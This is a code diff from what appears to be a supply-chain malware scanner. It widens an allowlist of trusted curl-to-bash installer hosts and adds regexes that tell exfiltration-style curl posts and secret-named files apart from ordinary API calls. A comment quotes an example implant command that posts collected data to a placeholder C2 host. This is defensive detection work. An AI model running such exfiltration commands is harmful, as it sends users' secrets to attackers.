@@ -68,6 +68,11 @@ _REPUTABLE_INSTALL_HOSTS = (
     "packages.cloud.google.com", "aka.ms", "dl.google.com", "storage.googleapis.com",
     "uv.astral.sh", "mise.run", "get.sdkman.io", "install.determinate.systems",
     "nixos.org", "tailscale.com", "get.nextflow.io", "micro.mamba.pm",
+    # Vendor package repositories with an official `curl <host>/script.deb.sh | bash`
+    # (nvidia/aistore confirmed on GitLab's own runner installer, 2026-07-22).
+    "packages.gitlab.com", "packagecloud.io", "apt.releases.hashicorp.com",
+    "download.opensuse.org", "dl.yarnpkg.com", "deb.nodesource.com",
+    "packages.confluent.io", "repos.influxdata.com", "packages.elastic.co",
 )
 
 
@@ -363,6 +368,34 @@ _STAGED_SHADOW = re.compile(r"(?:\$\{?\w+\}?|\"\$\{?\w+\}?\")/+etc/shadow")
 # `sed -i` / `install -m` WRITE to the file; harvesting requires reading it out.
 _SHADOW_WRITE = re.compile(r"\bsed\b[^\n]*\s-i\b|\binstall\b[^\n]*\s-m\b|\bchpasswd\b", re.I)
 
+# Exfiltration sends DATA OUT. `curl -d @file` / `-d @-` reads the body from a file
+# or stdin, which is how a real stealer ships what it collected. An inline literal
+# body is just an API call: nvidia/aistore confirmed on
+# `curl -X POST -d '{"action": "create_bck"}' http://172.50.0.2:8080/v1/buckets`,
+# which creates a storage bucket in a local Docker playground. Every REST call in
+# every repository has that shape, so the rule needs the data to be a file, a pipe,
+# or something named like a secret.
+_POST_FROM_FILE = re.compile(r"(?:-d|-F|-T|--data(?:-binary|-raw)?|--form|--upload-file)"
+                             r"\s*[\"']?\s*@", re.I)
+# A body built from a VARIABLE or a command substitution can carry anything the
+# script collected, so it stays exfiltration: `curl -X POST http://c2/ -d "$INFO"`
+# after a recon block is the textbook implant. Only a fully STATIC literal body is
+# treated as an ordinary API call.
+_POST_DYNAMIC = re.compile(
+    r"(?:-d|-F|-T|--data(?:-binary|-raw)?|--form|--upload-file)"
+    r"\s*[\"']?[^\"'\n]*[$`]", re.I)
+_SECRET_NAMED = re.compile(
+    r"id_rsa|id_ed25519|\.ssh/|\.aws/|\.env\b|/etc/shadow|credential|secret|token|"
+    r"password|passwd|api[_-]?key|private[_-]?key|\.pem\b|keystore|\$\(cat\s", re.I)
+
+# GitHub code-search qualifier syntax inside a string literal is a QUERY the tool
+# runs to FIND malware, not malware. n3mes1s/supply-stream, a supply-chain
+# detection corpus builder, confirmed on its own search strings, e.g.
+# 'type:gzip name:".tgz" content:"discord.com/api/webhooks/" content:"child_process"'.
+_SEARCH_QUERY_LITERAL = re.compile(
+    r"(?:^|[\s'\"(\[])(?:type|name|content|path|extension|filename|language|repo|org|"
+    r"user|size|fork|archived):\s*[\"'][^\"']*[\"']", re.I)
+
 
 def is_benign_construct(rule: str, line: str) -> bool:
     """True if a matched rule is a known-benign construct and must not be recorded.
@@ -372,12 +405,18 @@ def is_benign_construct(rule: str, line: str) -> bool:
     came from. Each branch cites the false positive that motivated it. Shared with
     the content scanner so a detector's inline rule table is neutral in both.
     """
-    if _PATTERN_DEF.search(line):
+    if _PATTERN_DEF.search(line) or _SEARCH_QUERY_LITERAL.search(line):
         return True
     if rule == "curl-pipe-shell":
         return _all_hosts_reputable(line)
     if rule == "shadow-read":
         return bool(_STAGED_SHADOW.search(line) or _SHADOW_WRITE.search(line))
+    if rule == "curl-post-data":
+        # Exfiltration needs a body that could hold collected data: read from a
+        # file or stdin, built from a variable or command substitution, or named
+        # like a secret. A fully static literal body is an ordinary API call.
+        return not (_POST_FROM_FILE.search(line) or _POST_DYNAMIC.search(line)
+                    or _SECRET_NAMED.search(line))
     return False
 
 
